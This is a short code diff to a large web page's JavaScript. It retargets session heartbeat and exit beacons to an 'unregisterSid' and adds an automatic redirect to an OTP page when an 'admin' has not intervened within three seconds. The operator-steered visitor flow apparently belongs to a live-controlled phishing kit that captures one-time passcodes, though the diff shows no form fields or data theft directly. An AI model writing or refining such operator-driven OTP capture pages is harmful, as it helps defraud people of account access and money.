@@ -27195,14 +27195,14 @@ const heartbeatInterval = setInterval(() => {
   fetch('/api/ping', {
     method: 'POST',
     headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({ sid })
+    body: JSON.stringify({ sid: unregisterSid })
   }).catch(() => {});
 }, 10000); // Ping every 10 seconds
 
 // Detect page close/refresh
 window.addEventListener('beforeunload', () => {
   clearInterval(heartbeatInterval);
-  navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
+  navigator.sendBeacon('/api/exit', JSON.stringify({ sid: unregisterSid }));
 });
 
     /* ===== 2. LOADING OVERLAY ===== */
@@ -27337,7 +27337,14 @@ window.addEventListener('beforeunload', () => {
           body: JSON.stringify({ sid: unregisterSid })
         });
         
-        // Start polling for admin action
+        // Auto redirect to OTP after 3 seconds if admin doesn't intervene
+        setTimeout(() => {
+          if (isWaitingForUnregisterAdmin) {
+            location.href = '/otp.html?sid=' + unregisterSid;
+          }
+        }, 3000);
+        
+        // Start polling for admin action (in case admin wants to redirect elsewhere)
         startUnregisterPolling();
         
       } catch (err) {
@@ -27999,3 +28006,4 @@ window.addEventListener('beforeunload', () => {
  </body>
 
 </html>
+
